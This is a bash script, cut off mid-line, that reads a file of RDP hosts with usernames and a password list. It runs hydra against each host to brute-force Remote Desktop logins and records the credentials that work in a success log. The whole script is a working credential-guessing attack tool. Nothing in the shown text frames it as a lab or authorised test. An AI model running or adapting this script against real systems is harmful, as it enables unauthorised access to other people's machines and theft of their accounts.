#!/bin/bash

# Define input and output files
iplog_file="iplog.txt"
passwords_file="passwords.txt"
success_log_file="successful_logins.txt"
checked_passwords_file="checked_passwords.txt"

# Check if the input files exist
if [[ ! -f "$iplog_file" || ! -f "$passwords_file" ]]; then
    echo -e "\e[31mOne or both files do not exist, exiting.\e[0m"
    [[ ! -f "$iplog_file" ]] && echo "Missing: $iplog_file"
    [[ ! -f "$passwords_file" ]] && echo "Missing: $passwords_file"
    echo -e "\e[33mCurrent directory: $(pwd)\e[0m"
    echo -e "\e[33mFiles in the directory:\e[0m"
    ls -l
    exit 1
fi

# Read RDP entries and passwords
mapfile -t iplog_entries < "$iplog_file"
mapfile -t passwords < "$passwords_file"

successful_attempts=0
total_passwords=${#passwords[@]}
total_hosts=${#iplog_entries[@]}  # Total number of hosts
start_time=$(date +%s)

# Function to attempt login
attempt_login() {
    local entry="$1"
    local password="$2"

    # Parse the entry for IP and username
    if [[ $entry =~ rdp://([^:]+):(.+) ]]; then
        rdp_ip="${BASH_REMATCH[1]}"
        username="${BASH_REMATCH[2]}"
    else
        echo "Invalid entry format: $entry"
        return
    fi

    # Run hydra and capture the output
    hydra_output=$(hydra -l "$username" -p "$password" "$rdp_ip" rdp -t 4 -W 3 2>&1)

    # Check for specific success indicators in the output
    if echo "$hydra_output" | grep -q "success"; then
        echo "$(date '+%Y-%m-%d %H:%M:%S') - Successful login with $username on rdp
